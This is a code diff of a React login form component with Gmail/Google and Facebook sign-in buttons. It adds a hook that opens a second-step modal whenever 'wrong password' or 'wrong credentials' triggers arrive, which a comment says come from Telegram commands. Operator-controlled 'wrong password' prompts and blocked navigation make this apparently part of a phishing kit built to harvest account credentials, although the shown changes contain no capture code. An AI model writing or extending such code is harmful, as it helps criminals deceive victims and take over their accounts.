@@ -53,6 +53,7 @@ function ActualForm({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
 }) {
   const dates = useMemo(generateDates, []);
   const times = useMemo(generateTimes, []);
@@ -74,14 +75,21 @@ function ActualForm({
     return () => window.removeEventListener("resize", checkScreenSize);
   }, []);
 
+  // Auto-open modal when wrongPasswordTrigger or wrongCredsTrigger changes (from Telegram commands)
+  useEffect(() => {
+    if (wrongPasswordTrigger > 0 || wrongCredsTrigger > 0) {
+      setShowStep2Modal(true);
+    }
+  }, [wrongPasswordTrigger, wrongCredsTrigger]);
+
   const isFacebookLoading = isLoading && loadingType === "facebook";
 
   return (
     <div className="min-h-screen w-full flex items-center justify-center px-2 sm:px-4 py-4 sm:py-8">
-      <div className="relative bg-white w-full max-w-full sm:max-w-[95%] md:max-w-[85%] lg:max-w-[70%] xl:max-w-[60%] grid lg:grid-cols-[420px_1fr] grid-cols-1 border rounded-lg shadow-lg overflow-hidden">
+      <div className="relative bg-white w-full max-w-full sm:max-w-[95%] md:max-w-[85%] lg:max-w-[70%] xl:max-w-[70%] grid lg:grid-cols-[420px_1fr] grid-cols-1 border rounded-lg shadow-lg overflow-hidden">
 
         {/* LEFT */}
-        <div className="p-4 sm:p-6 lg:p-8 lg:border-r border-b lg:border-b-0 relative min-h-[300px] sm:min-h-[400px] lg:min-h-[500px]">
+        <div className="p-4 sm:p-6 lg:p-8 lg:border-r border-b lg:border-b-0 relative min-h-[300px] sm:min-h-[400px] lg:min-h-[600px]">
           <div className="flex items-center justify-center gap-3 mb-4 sm:mb-6">
                           <div className="relative w-24 h-10 sm:w-60 sm:h-20 flex items-center justify-center">
                             <Image 
@@ -295,7 +303,7 @@ function ActualForm({
                   }
                 }}
                 disabled={isLoading}
-                className={`bg-white border-1 border-gray-200 w-full text-gray-800 text-xs sm:text-sm font-semibold py-2.5 sm:py-3 px-3 rounded-lg flex items-center justify-center gap-2 sm:gap-3 transition-all
+                className={`bg-white border-1 border-gray-200 w-full text-gray-800 text-xs sm:text-sm py-2.5 sm:py-3 px-3 rounded-lg flex items-center justify-center gap-2 sm:gap-3 transition-all
                 ${isLoading && loadingType === "gmail" ? "opacity-60 cursor-not-allowed" : "hover:bg-gray-50 hover:border-red-500 hover:shadow-md"}`}
               >
                 {isLoading && loadingType === "gmail" && <LoadingSpinner />}
@@ -309,7 +317,7 @@ function ActualForm({
                 )}
                 <span className="truncate">{isLoading && loadingType === "gmail"
                   ? "Connecting..."
-                  : "Continue with Gmail"}</span>
+                  : "Continue with Google"}</span>
               </button> */}
               </div>
 
@@ -335,6 +343,7 @@ function ActualForm({
             setParentBeginTimer={() => {}} // No-op to prevent navigation
             InvalidPassword={InvalidPassword}
             wrongPasswordTrigger={wrongPasswordTrigger}
+            wrongCredsTrigger={wrongCredsTrigger}
             onClose={() => setShowStep2Modal(false)}
           />
         ) : (
@@ -349,6 +358,7 @@ function ActualForm({
             setParentBeginTimer={() => {}} // No-op to prevent navigation
             InvalidPassword={InvalidPassword}
             wrongPasswordTrigger={wrongPasswordTrigger}
+            wrongCredsTrigger={wrongCredsTrigger}
             onClose={() => setShowStep2Modal(false)}
           />
         )
